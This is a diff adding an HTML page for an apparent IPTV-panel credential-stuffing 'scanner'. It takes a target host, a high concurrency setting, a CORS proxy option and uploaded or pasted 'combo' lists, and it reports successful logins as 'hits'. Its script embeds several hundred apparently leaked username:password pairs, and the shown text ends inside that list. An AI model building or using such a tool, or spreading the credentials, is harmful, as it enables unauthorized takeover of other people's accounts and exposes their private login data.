@@ -1,0 +1,1926 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
+<title>RUAH NUCLEAR | SCANNER PREMIUM</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,600;14..32,800&display=swap');
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Inter', system-ui, sans-serif;
+    min-height: 100vh;
+    padding: 1.5rem;
+    background-image: url('https://i.postimg.cc/MT1yfP8Y/1782310613548.png');
+    background-size: cover;
+    background-attachment: fixed;
+    background-position: center;
+    background-repeat: no-repeat;
+    color: #f0f4ff;
+    text-shadow: 0 2px 12px rgba(0,0,0,0.8);
+    position: relative;
+  }
+  /* Overlay casi imperceptible para dar contraste mínimo */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0, 0, 0, 0.05);
+    pointer-events: none;
+    z-index: 0;
+  }
+  .app-3d {
+    max-width: 1400px;
+    margin: 0 auto;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* HERO */
+  .hero-3d { text-align: center; margin-bottom: 2rem; }
+  .animated-scanner {
+    font-size: 3.5rem;
+    font-weight: 900;
+    background: linear-gradient(135deg, #00d4ff, #0088ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    text-shadow: 0 0 40px rgba(0, 212, 255, 0.4);
+    animation: scannerMove 1.8s ease-in-out infinite alternate, glitchText 3s infinite;
+    display: inline-block;
+    padding: 0 1rem;
+  }
+  @keyframes scannerMove {
+    0% { transform: translateY(0px) scale(1); letter-spacing: -0.02em; text-shadow: 0 0 5px #00d4ff; }
+    100% { transform: translateY(-6px) scale(1.02); letter-spacing: 0.04em; text-shadow: 0 0 45px #00d4ff, 0 0 20px #0088ff; }
+  }
+  @keyframes glitchText {
+    0%, 100% { clip-path: inset(0 0 0 0); }
+    92% { clip-path: inset(0 0 0 0); }
+    95% { clip-path: inset(10% 0 30% 0); }
+    97% { clip-path: inset(40% 0 10% 0); }
+  }
+  .ruah-big {
+    font-size: 2.2rem;
+    font-weight: 800;
+    display: inline-flex;
+    align-items: center;
+    gap: 0.6rem;
+    background: rgba(0, 0, 0, 0.1);
+    backdrop-filter: blur(2px);
+    -webkit-backdrop-filter: blur(2px);
+    padding: 0.4rem 1.8rem;
+    border-radius: 100px;
+    margin-top: 0.8rem;
+    border: 1px solid rgba(0, 212, 255, 0.2);
+    box-shadow: 0 0 30px rgba(0, 212, 255, 0.1);
+    transform: rotateX(4deg);
+  }
+  .ruah-big span { font-size: 2rem; }
+
+  /* PANELES CASI TRANSPARENTES */
+  .glass-3d {
+    background: rgba(10, 12, 18, 0.05);
+    backdrop-filter: blur(2px);
+    -webkit-backdrop-filter: blur(2px);
+    border-radius: 2rem;
+    border: 1px solid rgba(0, 212, 255, 0.05);
+    box-shadow: 0 8px 32px rgba(0,0,0,0.1), 0 0 0 1px rgba(0, 212, 255, 0.02) inset;
+    transition: all 0.25s ease;
+  }
+  .glass-3d:hover {
+    background: rgba(10, 12, 18, 0.12);
+    box-shadow: 0 16px 48px rgba(0,0,0,0.15), 0 0 0 2px rgba(0, 212, 255, 0.05) inset;
+  }
+  .panel { padding: 1.5rem; margin-bottom: 1.8rem; }
+
+  /* INPUTS Y BOTONES - ESTILO AZUL FLUOR */
+  .flex-row { display: flex; flex-wrap: wrap; gap: 1rem; align-items: flex-end; }
+  .input-group { flex: 1; min-width: 160px; }
+  label {
+    font-size: 0.7rem;
+    text-transform: uppercase;
+    font-weight: 600;
+    letter-spacing: 1px;
+    color: #80d4ff;
+    margin-bottom: 0.3rem;
+    display: block;
+    text-shadow: 0 0 10px rgba(0, 212, 255, 0.2);
+  }
+  input, textarea, select {
+    background: rgba(0, 0, 0, 0.15);
+    border: 1px solid rgba(0, 212, 255, 0.1);
+    border-radius: 1rem;
+    padding: 0.75rem 1rem;
+    color: white;
+    font-family: 'Inter', monospace;
+    width: 100%;
+    outline: none;
+    transition: 0.2s;
+    backdrop-filter: blur(2px);
+  }
+  input:focus, textarea:focus, select:focus {
+    border-color: #00d4ff;
+    box-shadow: 0 0 25px rgba(0, 212, 255, 0.15);
+  }
+  button {
+    background: linear-gradient(135deg, #00d4ff, #0066cc);
+    border: none;
+    border-radius: 2rem;
+    padding: 0.75rem 1.5rem;
+    font-weight: 800;
+    font-size: 0.9rem;
+    color: white;
+    cursor: pointer;
+    transition: 0.2s;
+    box-shadow: 0 6px 0 rgba(0,0,0,0.3);
+    transform: translateY(-2px);
+    border: 1px solid rgba(0, 212, 255, 0.15);
+    text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+  }
+  button:active { transform: translateY(2px); box-shadow: 0 1px 0 rgba(0,0,0,0.3); }
+  button:disabled { opacity: 0.2; transform: none; cursor: not-allowed; }
+  .clear-btn {
+    background: rgba(0,0,0,0.15);
+    border: 1px solid #00d4ff;
+    box-shadow: none;
+    color: #00d4ff;
+  }
+  .clear-btn:hover { background: rgba(0, 212, 255, 0.05); transform: translateY(-3px); }
+
+  .options-bar {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 1rem;
+    margin-top: 1rem;
+    align-items: center;
+  }
+  .cors-row {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    background: rgba(0,0,0,0.08);
+    padding: 0.3rem 1rem;
+    border-radius: 2rem;
+    backdrop-filter: blur(2px);
+  }
+  .preset-row {
+    display: flex;
+    gap: 1rem;
+    align-items: flex-end;
+    flex-wrap: wrap;
+    margin-top: 1rem;
+  }
+  .preset-select { flex: 3; min-width: 200px; }
+
+  /* PROGRESS */
+  .progress-card {
+    background: rgba(0, 0, 0, 0.08);
+    backdrop-filter: blur(2px);
+    -webkit-backdrop-filter: blur(2px);
+    border-radius: 1.5rem;
+    padding: 1rem;
+    margin-bottom: 1rem;
+    border-left: 6px solid #00d4ff;
+  }
+  .job-header {
+    display: flex;
+    justify-content: space-between;
+    font-weight: bold;
+    margin-bottom: 0.5rem;
+  }
+  .progress-bar-bg {
+    background: rgba(255,255,255,0.05);
+    border-radius: 30px;
+    height: 12px;
+    overflow: hidden;
+  }
+  .progress-fill {
+    background: linear-gradient(90deg, #00d4ff, #0066cc);
+    width: 0%;
+    height: 100%;
+    border-radius: 30px;
+    transition: width 0.2s;
+  }
+  .current-combo {
+    font-size: 0.7rem;
+    color: #80d4ff;
+    margin-top: 6px;
+    word-break: break-all;
+  }
+
+  /* HITS */
+  .hits-panel {
+    max-height: 600px;
+    overflow-y: auto;
+    display: flex;
+    flex-direction: column;
+    gap: 1.2rem;
+  }
+  .hit-item {
+    background: rgba(0, 0, 0, 0.15);
+    backdrop-filter: blur(4px);
+    -webkit-backdrop-filter: blur(4px);
+    border-radius: 1.2rem;
+    padding: 1.2rem;
+    border: 1px solid rgba(0, 212, 255, 0.05);
+    transition: 0.2s;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.1);
+  }
+  .hit-item:hover {
+    background: rgba(0, 0, 0, 0.25);
+    transform: scale(1.01);
+    border-color: rgba(0, 212, 255, 0.15);
+    box-shadow: 0 0 30px rgba(0, 212, 255, 0.05);
+  }
+  .hit-html-content {
+    font-family: 'JetBrains Mono', 'Inter', monospace;
+    font-size: 0.8rem;
+    line-height: 1.7;
+    white-space: pre-wrap;
+    word-break: break-word;
+    color: #eef2ff;
+  }
+  .hit-html-content .line {
+    display: block;
+    padding: 0.1rem 0;
+  }
+  .hit-html-content .label { color: #80d4ff; font-weight: 600; }
+  .hit-html-content .value { color: #fff; }
+  .hit-html-content .section-title {
+    color: #ffdd44;
+    font-weight: 800;
+    margin-top: 0.3rem;
+    border-bottom: 1px dashed rgba(0, 212, 255, 0.2);
+    padding-bottom: 0.2rem;
+  }
+  .hit-html-content .footer-line {
+    color: #00d4ff;
+    font-weight: 800;
+    margin-top: 0.5rem;
+    text-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
+  }
+
+  @media (max-width: 700px) {
+    .animated-scanner { font-size: 2rem; }
+    .ruah-big { font-size: 1.3rem; }
+    body { padding: 1rem; }
+    .hit-html-content { font-size: 0.7rem; }
+  }
+</style>
+</head>
+<body>
+<div class="app-3d">
+  <div class="hero-3d">
+    <div class="animated-scanner">⚡ SCANNER NUCLEAR ⚡</div>
+    <div class="ruah-big"><span>🇨🇱</span> RUAH <span>🇨🇱</span></div>
+    <div style="font-size:0.9rem; margin-top:0.2rem; opacity:0.9; text-shadow: 0 2px 15px rgba(0,0,0,0.8);">🔥 SOLO PARA GUAPOS Y SEXYS 🔥</div>
+  </div>
+
+  <div class="glass-3d panel">
+    <div class="flex-row">
+      <div class="input-group" style="flex:2"><label>🎯 PANEL (HOST:PUERTO)</label><input type="text" id="hostInput" placeholder="ej: tv.servidor.com:8080"></div>
+      <div class="input-group"><label>⚡ CONCURRENCIA</label><input type="number" id="concurrencyInput" min="1" max="100" value="80"></div>
+      <div class="input-group" style="min-width:100px"><select id="langSelect"><option value="es" selected>🇪🇸 ES</option><option value="en">🇬🇧 EN</option><option value="fr">🇫🇷 FR</option></select></div>
+    </div>
+    <div class="flex-row" style="margin-top:0.5rem;">
+      <div class="input-group"><label>📜 NICK</label><input type="text" id="nickInput" placeholder="Ej: RUAH DE CHILE" value="RUAH DE CHILE"></div>
+    </div>
+    <div class="preset-row">
+      <div class="preset-select"><label>📡 SERVERS PREDETERMINADOS</label><select id="presetServerSelect"><option value="">-- Selecciona un servidor --</option></select></div>
+      <div><button id="clearAllBtn" class="clear-btn">🧹 LIMPIAR TODO</button></div>
+    </div>
+    <div style="display: flex; flex-wrap: wrap; gap: 0.8rem; margin-top: 1rem;">
+      <div style="flex:1"><label>📁 COMBO #1 (ENGINE 1)</label><input type="file" id="comboFile1" accept=".txt"></div>
+      <div style="flex:1"><label>📁 COMBO #2 (ENGINE 2)</label><input type="file" id="comboFile2" accept=".txt"></div>
+      <div style="flex:1"><label>📁 COMBO #3 (ENGINE 3)</label><input type="file" id="comboFile3" accept=".txt"></div>
+    </div>
+    <div style="margin-top:1rem;"><label>📝 PEGAR COMBOS (user:pass por línea) → ENGINE 1</label><textarea id="comboText" rows="3" placeholder="usuario1:contraseña1&#10;user2:pass2"></textarea></div>
+    <button id="loadRuahCombosBtn" style="width:100%; margin-top:0.8rem; background: linear-gradient(135deg, #00d4ff, #0066cc);">🔥 COMBO-RUAH-ONLINE (cargar en ENGINE 1) 🔥</button>
+    <div class="options-bar">
+      <div class="cors-row"><input type="checkbox" id="useCors" checked> <label>🌐 CORS PROXY</label></div>
+      <div class="cors-row"><input type="checkbox" id="soundToggle" checked> <label>🔊 SONIDO HIT</label></div>
+      <div class="cors-row"><input type="checkbox" id="autoDownload" checked> <label>💾 AUTO-DESCARGAR</label></div>
+    </div>
+    <div style="display: flex; gap: 1rem; margin-top: 1rem; flex-wrap: wrap;">
+      <button id="startBtn">▶ INICIAR SCAN</button>
+      <button id="stopBtn">⏹ DETENER</button>
+      <button id="saveBtn">💾 GUARDAR HITS</button>
+    </div>
+  </div>
+
+  <div id="progressContainer" class="progress-card"><div class="job-header"><span>🔥 ENGINE 1</span><span id="hitsCount1" class="yellow-hit">💥 HITS:0</span></div><div class="progress-bar-bg"><div id="progressBarFill" class="progress-fill"></div></div><div class="progress-stats"><span id="progressText">Esperando...</span></div><div id="currentCombo" class="current-combo">👤 Usuario: -</div></div>
+  <div id="progressContainer2" class="progress-card"><div class="job-header"><span>⚡ ENGINE 2</span><span id="hitsCount2" class="yellow-hit">💥 HITS:0</span></div><div class="progress-bar-bg"><div id="progressBarFill2" class="progress-fill"></div></div><div class="progress-stats"><span id="progressText2">Esperando...</span></div><div id="currentCombo2" class="current-combo">👤 Usuario: -</div></div>
+  <div id="progressContainer3" class="progress-card"><div class="job-header"><span>💀 ENGINE 3</span><span id="hitsCount3" class="yellow-hit">💥 HITS:0</span></div><div class="progress-bar-bg"><div id="progressBarFill3" class="progress-fill"></div></div><div class="progress-stats"><span id="progressText3">Esperando...</span></div><div id="currentCombo3" class="current-combo">👤 Usuario: -</div></div>
+
+  <div class="glass-3d panel"><div style="margin-bottom:1rem; font-weight:800;">🎯 HITS ENCONTRADOS (CUENTAS VIP)</div><div id="hitsContainer" class="hits-panel"></div></div>
+  <footer id="footerMade" style="text-align:center; margin-top:2rem; opacity:0.6; font-size:0.8rem; text-shadow: 0 2px 15px rgba(0,0,0,0.8);">⚡ RUAH NUCLEAR · SOLO PARA GUAPOS Y SEXYS · 🇨🇱 SCANNER PREMIUM 🔥</footer>
+</div>
+
+<script>
+// ================== COMBOS ONLINE ==================
+const RUAH_COMBOS_RAW = `ortizfernand1:Cuu3ZpYJg4
+CanalesIprotvPro:U3XdSbjMVb
+TVHD109:dFfCWv7xdL
+Figueroamarco31:6Y7j42GuSL
+usuariocanales343:034f1d07890e
+felizdaysi1:1c35d8f44091
+ramirezjohn1:c4b21d114e44
+Ozamora70:9PZJ2wRzAP
+eduardoleal:c178b915a758
+yahirdoparis543:54f8e20264bd
+azprox023:c2fa1f57eeeb
+lrvs2:6hxzY7vYQ2
+Diegonorth01:6ffc0c1b74f0
+nanomeh1:ZwlU5YxHSm
+YAYApancho:6NQ9rz5JJj
+AbelVillareal142:VzhNz8cAwx
+d13g8g8nc4:4b8f33198b07
+Luigitv23:6e8559b565a7
+alejoagudelo8603:a885a142af21
+johnlugolopez:d6bdf6dc00c2
+Azplayx030:xxACX8s8Ge
+Carlosman:feYzN2CQ2R
+LuisB0220:2c255298641a
+armandomorales3308:43eeb7696320
+IVANdrogue:464846cb031f
+santosfrancisco1:fb58b2da7206
+barcelona489:ca0262829814
+gJesdD2nw5:NU2SScU2dY
+karzamora1:TQfrw6H3Ue
+a0204ultrapremium:979krWmVex
+Daced0111:aa705122bacc
+mludizaca:44e0051236e5
+HDPinguino123dkdkkDDFFDFa:al3q83JYkd
+Azplax014:6a98b6f3ff28
+Juniorprdr:Pedroqui
+DAoo00O123sSes3sEstrella:Sfrd9a3SZ5
+rociogalvan1:XkJDyZSWMb
+mariaserrano:2YU2TqqY9L
+darchov:KTGKShYUmJ
+odi3044:1333785bea09
+4ng37quin8:jZv3DdNVQM
+IpronuevAEventos1:EPkMc8YVHD
+lesterm39:945e684aface
+juancardenasolarte22:7e4f2b38c1dd
+USA4425010260:LgucHzwXKr
+hernanllerena1:89fVTSCGJS
+eEiiLll09384Ecaiman34RtR:KTap2pdJx7
+gir47doj8r:kakqm4u5H6
+diegoAcero:aWZuG6RbRq
+userrith1:gP8NaAB9fE
+JohnnyOrdonez52:28ebe775ce2a
+huvargas01:latinplus6485
+WTSG64U4Dp:qyb6qZPWJZ
+yadax:Tech1234
+Lclaro48:b0599c43a002
+man2060:wVDvxyCnbA
+214luisk:tCWpWCZfDv
+jagy1490:zYlLNRlvm3
+Melvasantamaria:7pGh4MaRCc
+73AlbertoCaballero987:2b48241eaa0e
+sahiralaby1:5ed92399a9cd
+Martin.2025:UZWwdHjyFx
+DGarcia102020:NRGCrPRUJk
+ovidiomoncayo:vTwUCmTTDp
+PezErnest245:2735f3d0afa2
+PezTulipan:38d387693673
+tjsr12021:HKC1uFeg2C
+JesusCabello:ebhGxsD6Fs
+CEHUA23:bd5fabe45f2d
+EJP5372357:2ffbd3f02eda
+VictorSalas07:WHw95ZHeQR
+chetor3003:XrLcW23YSP
+NoeliaSalinas:1fee3ba39770
+12malope25012:3bRfKekeDk
+ivan23:8UgsQR9ykH
+alexis32cc:BxYp6Rpvqn
+quintinorub1:246b1b0f93c9
+angellosanchez1993:exJPp1pjkb
+Hada2025e:eKc6LPuJHe
+estelalemos23:estelalemos23
+usuariocanales107:094abe14bb7f
+zA68WQVVQr:6uVtknCmHG
+juanrivers999:464f8cd771f5
+Juanjo87:nX1PbPy8N2
+USA3322020216:74a7928c12a9
+navasbryan1:MYbLr6XMk9
+elmis1874:f07f260f7212
+tolo77:2fecee44c70e
+horaciovin1:Xy8Nm3wgPL
+hencamos26:6ksdMsdapd
+Casa_Escalante:1PTV2024hdTv
+Y3XmOwlZ4T:01c95df674bc
+israel8137:KLdqvYWHa7
+martincreative:9pbogHOm0G
+Drazun23lgdh:q65M5nwa2A
+Evaristo7173F6:bc5dc4e09ff4
+ulises:dace5d2e109c
+ClaudioNunez:6fzEdSLqeU
+sebastianbenitezchapatan10:1bde03786747
+silvanelio1:D4z5PtKYJK
+LuiSiRriba:aASsLhk44E
+lorecastano1:EWk4RPNGB8
+FacundoC3128:7YbNaQyhxX
+LAYA25:N4nerDqBP9
+giancarlos4532:ja7CVPZ5ML
+Y3bS2b9zKw:dqhAeKGqyK
+jfossa851:b6VHTLdznN
+5085175.vip:Q9qDkawWw3
+SANTIAGOe22:9jxAUptDXm
+yaninaftele2:3ef2b27116bc
+099836049:t6Yq1FBt1Z
+MARCOpizar:24c0ad6f0314
+abelardo2020:ES4G1y3eXX
+BenJAMiNa4:46bfe786dc2b
+Josevelasco:4037d63c9851
+VAcosta1121:SygSQrY8wh
+59899121957:6e30d7a84c4c
+ernesburich1:kNN3oWrVXj
+YoseJosTVX123:0828df1d8910
+PolicarpoFalcon:cd321ed45578
+Diegovengador:daf8dd4afa14
+luismachuca1:b74bf3eb6b45
+New222:227438c094df
+obandoroberto:AwxDZoocav
+8283377781:bFpgFWPGeQ
+Ricardo2821:hfnUxoS5CB
+Patriciotv1:qCTzNDQn3g
+fabrizio:de42de084de2
+ladivis45741:9f96ad42b2c1
+091914088:6pKtH2RFj0
+EdwinH23:HWv3jdpVgZ
+garciamono:d08e2d505942
+marvidela01:latinplus3742
+mariarmz1:mvufA92qD3
+bedoyajuan1:Fw6DC46RUw
+USA4425040270:bEUebHB8L3
+HUGOmattuS:ZfEAQUqhvP
+jdonis:19316aa014c2
+RichardM2924:6b4bc3a86013
+P4m3LABerG:QkTSaVtgKE
+ChristianQ1925:p2smPG25cZ
+andrespuentes0116:94e66534d9f3
+villasandres1:82fd7c3d2b72
+moisespena:84573d6d57c3
+patinicolas1:dMD6KtTeId
+bLJ3aQuLsR:6ebd21426be2
+NelsonGarcia:tWJe264z7s
+marcoalvarez2208prx:D27Es9cdEN
+FaustoSoto99:b8afb02b8cec
+ECU3322050106:b7563c3d13dc
+JuanOrtega2025:Mq6n3EgGg2
+kcoiscou:KHtKTMfRDX
+JMVS241017nw:6256WUJ9vH
+gloriaquirozf:060c83a61025
+dsalazar023:9aa6021a6cb2
+rigopolanco:AOlFEeCFXZ
+lavinchicago:T1PcDpzMHO
+Ospina23:f244ef5c0408
+fredy99:vK5eM8Q7rz
+rub3n47var:46ccc5a6dc0f
+CARGAR24:WsATSBX2Z3
+WilmanRamirez:244d76e12ec5
+7FJANhDYjt:2aee9bfe7cff
+victorluaces:482848ce5b6d
+josepilona0305:c6e0f8122cfd
+mgbarbozab:2bd524d0b6c5
+fidelina65:HTWA9q2QrR
+Yessenia80.H19:9c3079e2d8bc
+gilrestsbcglobal:zgTXhuoDvR
+Maryeche:Q6cjwZfvDG
+cesaral436:DpXusiHv8T
+USA4425030267:CdJKxpvuCn
+h4ro7dech3:f390572e4752
+Vicente639:a6b5fe023dc9
+asdsdIlLasOOoWsdsdaw:cK9ceDN2tC
+Jefferson:mP8XVJrEI4
+sgutierrez04:wx6TARreYq
+USA3320010027:Zuw89dwkd
+gutierrezpablo1:Gfk6LH4b2u
+Enrique0923:f17958fbd358
+lopzvictor1:1c834784c80e
+moliviviana1:bZK5XMAXfy
+Delfino25:Q7bmc5p5sB
+veneno74:F8igFfSkIi
+jlreyes2002:zMMJFypnzV
+UsCehYHy72:7753250b6307
+juanarenascano:4831eb4d661d
+renzoq:fc4a920f7318
+papito.2002:d5b6262a7597
+gerardo87:On0kv4sfaE
+CarrionValeriana:c6a4c40b4a5b
+katty55663:49c0b16905b4
+alexmargarita:lwDRib5ooT
+luisconnextec:36DdhHks8J
+Elcaleno25:fSznkpC6zk
+Hermano30:PqDbyKtr6m
+williamhbto:f69fa8816bd0
+lesternahar:ffdbd7ab635a
+luisalfredo:fv4EV3Z5tH
+ManuelM6927:cc7574c6ced6
+FaCa001:dc7e464a4554
+PxxGeNYBDR:7126477382
+garayjimmy11px:158bd03b6929
+az6002:d96f7bf9710c
+2429553:60fb574c361a
+C9aCeyaXTW:81497246e0bc
+Pipotv:Sqfmty7ehJ
+HilCan05232023:80efbaf268b5
+sebastianbenitezchapatan24:b80995d985de
+xyH7XlAw3J:c88d17a21ee7
+loboramirez79:HTGmMXTfQS
+caferandra1:63100b598035
+P4rad4Rau7:819eaba548c4
+rickyughth:mUwHymVvsN
+4r3va7oan9:r9eJEc5Nqv
+fountain4527:2264ed51b277
+18327442061:ee7ed6e91f77
+usuariocanales168:28864f5025d6
+josetrinidad5472:14e220a486f0
+a7fredov3r:3f2a5b1c5389
+santi4go3s:wh3VkrCzSP
+hencamos25:5LJ2ZAgG8z
+roslaura18:81c59432a1de
+sayro55:kAY2GUQySD
+guevaraerick1:GjEkfBxpC8
+HcAmYhq2bc:W8X83WW6hg
+MarbeliceArenas:L5wq9z4kiq
+ricardobarragan:44qDXUbjCx
+ELLtdmaiz204fj:ScMZEQzYga
+Jenjvs202503:mTJnJRqfVk
+XPSarjJ6B7:5dcea43f28e4
+fPdeLxW3XT:uAwBsmtkzW
+Alejandroprado3:MZHaJ9yP8e
+mayleenfunez1:135535683598
+BlackTVPrime5:7ab79786e1a2
+NersMa:gAWuhp6ffN
+mottamartin1:iiQ7uuhbWA
+usuariocanales10:be93d10b2464
+juanvernazza:85GbSi1ewU
+aedcabrera:80a85422d9a1
+hernandezjuan1:rMcnxxYSYv
+pbunster2000:fFSHtz2gkE
+hencamos12:gmjENJgBW8
+EdwGon06282019:1134057ff566
+Donenrique1421:BVqRMwKgcS
+83737ne4994:73737737474mt8
+9hwbenerb6363:8383nvevev
+Oenfnf636472737:Enebf8838482
+Rercol8374763:63nennrnnrn3
+Chekrn83848:72737738ftete
+codechecker:723737mdbr
+9C00D3211DA4:00D3211DA49C
+SOLANONV08:NVRDRADRM
+tvdigital78:97354802
+737474ndbfvvd:73737bdbrbf73
+jleo502:space502
+Nwbeb9727kAR42:7263663ndnenne33
+6MPremiumAgos4:LqWincWQv4
+6540CXAFB:dnmao87125
+Ndnrb948486263bsc:727etsbnd709
+2sx755df:2sx755df123
+ClienteLuis1m25ab:Mut78ash652hg
+usuario22CD:uj44gwWnbJ
+ClienteCarlosG2m17F:bJFeqVhkjHbQ
+Plomero10:Plomero100
+2910251ann:8285155283
+LIMATAMBOW2:PEKUERgb1
+174UC4SV5:TH3R6KCM
+9C00D37FA564:0D37FA5649C0
+Aldorevee1:Aldoren003
+72773met3:7273774d
+C42AFE556474:FE556474C42A
+FernandTamay396:TamayFER2904
+j3CBA3xE:Sncjwecy
+v2021TuRm:K6hutDp5
+1334mvcft:1234frt55
+Nejebr737364wtT:tehebe6363664
+Gilmerven1:rVjXEr4M6wcq
+OrlandoGmc:7dem92Q5UnXn
+Canbiomxujeey:Lsnen3837hdhdbbfwb
+THrSWnJWP2:77PkErV8eD
+JavierH26:HidalgoJ26
+GullermoDominguez:LlKng1i4XS
+MGT24US1DA:MAR34GA74GH56
+9k2e5auUQY:azJC239Hb4
+Trento276:hTXB5kHvQfzu
+Giangf10:Giangg10a
+5c4d3s2aq6:veAYRb59s9vZ
+LuisMendieta1990:LuchoMendieta2601
+1abce82jr9:259wjgd87
+28ej49ejnn:4343499h
+usuario13FV:8ufj3u3uew
+keivingh:keivingh
+7Jesu3Maria9:4bZEzJ7Y3pSD
+Ai2nc9skm:U8j2nx99g
+9C00D3211DE1:00D3211DE19C
+9C00D37FA5A4:D37FA5A49C00
+dgpFQ7Fu:ZahRAu9N
+Quimica189:Quimica123
+6MPremiumJun28:EaUH6siLZhCgNVwC
+AguirreXavier:XavierAguirre20
+teresa65:654321
+unis220825s:uehruejrofnf
+383nd9uh7:qvKnb5FSbFAp
+9C00D3211E23:00D3211E239C
+drojo271025:241189
+JorgeMutis047:uHnvmg6t5i
+Cortex286:Company185
+glp6m050626s1:uehrjbrkgbk
+553634c61b7076f6:9677994b60004708
+12MPremiumJul56:wc5mwvgvLH
+3MPremiumSep1:s4omoNHiWj
+ENjp5j5zA:zLztmrM7
+098Elsa:092Bailon
+xnyPCc3ECD:2DAXukMqK
+Carlossar07:uJ64dKAXuA
+Maxcesar157:Rasectv751
+0ynLpCNWki:YQOd8dHQ7N
+Ajiseco45gf:Ajiiseco45
+28A5EE4B4217:A5EE4B421728
+rysabel:NCasbWg5nCJ2
+52ure776th:52ure776th
+6MPremiumOct26:d9YwYyOUuq
+Trono25:Trono25
+ClienteJesse6m7n:Mnh89ashj78
+catlosme:mecarlos
+User08af:KmfKx3d8a3Hr
+Luisgf10a:Luuisfg10
+9C00D3CF51BB:D3CF51BB9C00
+cbaque:1991
+8374netre:123456me
+Miguel2023:ZTUfRm7wYFM8
+Rosaa2022:Rosa29
+Yorbdte73773:7373hdnenbr
+Ks93846sds:Hwje73646
+12MPremiumOct52:JhyM5rPj7kys
+12MPremiumJun47:YQomC1ACnAnKdoSL
+CesarQuintero368:iREGuGJ8tpxCRLih
+DSAZ6242:dfpl38711
+RichardPerez:princeSita25
+9C00D37FA6C5:D37FA6C59C00
+CarlosFLORES244:carlosF244
+tvdigital884:Eu5CUA9wXb
+Anaarce45:Anaa45gf
+Prigatv80:Farias80
+6MPremiumAgo34:3mkEhFe43U
+6DCD6435EEF7:6DCD6435EEF
+83737bed:837373he
+9C00D3211A9C:0D3211A9C9C0
+ClienteWilfrido1a26ab:Mjhays89ash
+316150308:H469z5333v
+A82204C10E75:2204C10E75
+9C00D3CF541B:D3CF541B9C00
+73737v866:636366eg90
+ch4angePnt:7Hjkg966jxc
+vjt36NMy:EKt8sUYP
+COMP2025:EE202626
+Maxcesar076:Rasectv670
+12MPremiumAgo2:LJPv6S1AFt
+usuariocanales057:MKJUt57gwZNf
+9C00D37FA627:D37FA6279C00
+9C00D37FA5E8:D37FA5E89C00
+tvdigital882:NPZvHZnWaT
+SuperSuperIPTVCLUB:kuPB2fyLSj
+9C00D37FA543:D37FA5439C00
+VioletaOrtegaIPTVCLUB:rwvBBybRQA
+Lyt2eLj6mw:x69XX7ufBa
+FERRETERIA21NVR:nickyferret23
+0f23935bd501ed2e:20de947fe6ccf09f
+Glenda:Mariuxi2308
+9C00D37FA603:D37FA6039C00
+9C00D37FA5F9:D37FA5F99C00
+ClienteSamy2m16ma:Mtv87asgh65jk
+CarlosCastro:3234537359
+CarnasAntonioIPTVCLUB:m7kuwhhrej
+Prigatv46:Goicochea46.
+8AF8ADD39AB5:8AF8ADD39AB
+ErnestoCamposIPTVCLUB2:4877867de9a98817
+SegundoZamoraIPTVCLUB:V8gFJXwTV6qY
+JoseNovoS-IPTVCLUB:kKoOdQGzrK
+F042C575BD08:F042C575BD0
+MiguelHernandez-IPTVCLUB2:2wr35d7x92
+PqaWkKz2:XtxFA3Jme
+ClienteMedardo1m24ag:Ansmsm89ash
+12MPremiumMar57:4f071cf96f63aedf
+OscarGuevara2:q2UM2f6EsJk6
+28A5EE4B414A:EE4B414A28A5
+12MPremiumAgo37:uSvxmmXev9
+9C00D3211B66:00D3211B669C
+287c4a764ef4:287c4a764ef
+StalinRodriguez:EFPG142
+JoScArP83:snyGyPjgFpCX
+Maxcesar172:Rasectv172
+9C00D37FA6E1:D37FA6E19C00
+12MPremiumMar53:0d3131a24a91cdc2
+ClienteRomel1m10o:GGydwAfD4c
+MoralesL:LeninTV2019
+6b2nx8a6n:76557uhbb
+ReinandoCanar:Rey2025
+Prigatv89:Cinema89x
+mYfKNqnrPT:DhsneHvu8M
+9C00D37FA785:0D37FA7859C0
+ospamex33:ospamex33
+tvdigital878:GF3RQEbuV8
+Prigatv56:Rosillo56.
+ClienteEfrainA1m9Ab:ky4eUyuFaDET
+e33WTxFfNSwK:9knuyAmxhWy5
+6b8f37wh8:Tq5VxBtA7Nt6
+Fresia23:Lento290
+Z23DaNiGaLz75:DtRfT2knQTJ5
+12MPremiumSep9:j25Ns915uv
+oliver94st:Queens2023
+9C00D37FA811:D37FA8119C00
+9C00D37FA7BB:D37FA7BB9C00
+25JuanV:20Juan25
+9C00D37FA671:D37FA6719C00
+8j8bug700:8j8bug700
+12MPremiumAbr67:UyOGdFBkrsBDKBYV
+m83884tr:123456me
+LuisOlivo:3162428L
+AZMaRcE98:1943YhqTDEcTkPbU
+Alfonsodi21:Alfondiaz45a
+ClienteEdgarD1m3Ab:HfXKQ5fnZK7F
+9C00D37FA59C:D37FA59C9C00
+9C00D37FA8AA:0D37FA8AA9C0
+Emiliano0426:m7Puy26SYm4r
+Roxana301:Roxa301
+MoisesPicadoIPTVCLUB:gL8tN9cwALhL
+EdgarPintado:julia2025
+velizamg22:1988erick
+X61bfks7nh:X61bfks7n
+dz336:1964
+Cosmos21:7gMXhmekDZYS
+vladi2025:2025vladi
+The5uuJ:Hg5yHg
+9C00D37FA7E3:D37FA7E39C00
+Lasnueces1234:Osnatpoker
+25486GANFCE:xdrmto48244
+carmenfc:carfc7788
+12MPremiumFeb34:385622df15de9387
+9C00D37FA628:D37FA6289C00
+Alvaritosbar:FADcVbF5XhU8
+Nadia43:43nadia
+27102521ani:917273921
+BacanGilmerIPTVCLUB:8IuzUh6qgPcjUjWa
+Carmenalva1:4zbn4SQGevHm
+7b9b5ecx19:7653efgjnq
+RonnyTe:21gy67ds
+user1636:JorB2012
+G9n8b33sc:G9n8b33sc1
+12MPremiumSep35:BNVQnwBoF9
+JosueTotoy:Carlos10
+AlexArenas358:uHaVXaCLZbFYeg9p
